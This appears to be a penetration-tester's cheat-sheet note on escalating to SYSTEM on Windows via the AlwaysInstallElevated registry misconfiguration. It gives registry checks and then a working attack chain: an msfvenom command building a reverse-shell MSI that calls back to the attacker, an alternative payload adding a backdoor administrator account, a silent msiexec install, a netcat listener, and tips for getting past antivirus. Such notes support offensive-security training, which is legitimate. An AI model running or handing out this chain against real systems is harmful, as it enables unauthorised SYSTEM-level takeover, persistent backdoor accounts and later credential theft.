# 🪟 AlwaysInstallElevated

> A policy misconfig where **both** HKCU and HKLM registry keys are set to `1` → any `.msi` you run installs **as SYSTEM**. Quick, reliable, and easy to check.

Part of [[Windows Privilege Escalation]]. Related: [[Shells]] · [[File Transfer Cheat Sheet]]

---

## 🧠 THINK
- Needs **BOTH** keys = `0x1` — one alone does nothing.
- Then craft a malicious MSI (`msfvenom`) and run it with `msiexec` → SYSTEM.
- PowerUp checks this automatically (`Get-RegistryAlwaysInstallElevated`).

## ⚡ DETECT
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**Look for:** both return `AlwaysInstallElevated  REG_DWORD  0x1`.

## 💥 EXPLOIT
Build a malicious MSI on Kali:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o evil.msi
```
(Or add an admin user MSI: `-p windows/x64/exec CMD="net user hacker Pass123! /add && net localgroup administrators hacker /add"`.)
Transfer it ([[File Transfer Cheat Sheet]]), then on target:
```cmd
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```
Start your listener first (`nc -lvnp 443`) → SYSTEM shell.

## 🔁 FOUND → NEXT
| FINDING | NEXT |
|---|---|
| Both keys = `0x1` | msfvenom MSI → `msiexec /i` → SYSTEM |
| Only one key = `1` | not exploitable — other vector |
| SYSTEM shell | dump hashes → [[Dumping Windows Hashes]] |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Only one/zero keys set | not vulnerable — [[Token Privileges & Potato]] / [[Windows Service Exploits]] |
| `msiexec` blocked/AV | try an admin-add MSI payload; rename; run from Temp |
| No callback | listener up? correct tun0 LHOST/port? → [[Reverse Shell Not Connecting]] |

## 📇 CHEAT SHEET
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f msi -o evil.msi
```
```cmd
msiexec /quiet /qn /i evil.msi
```
**Kill shot:** both keys `0x1` → malicious MSI → SYSTEM.
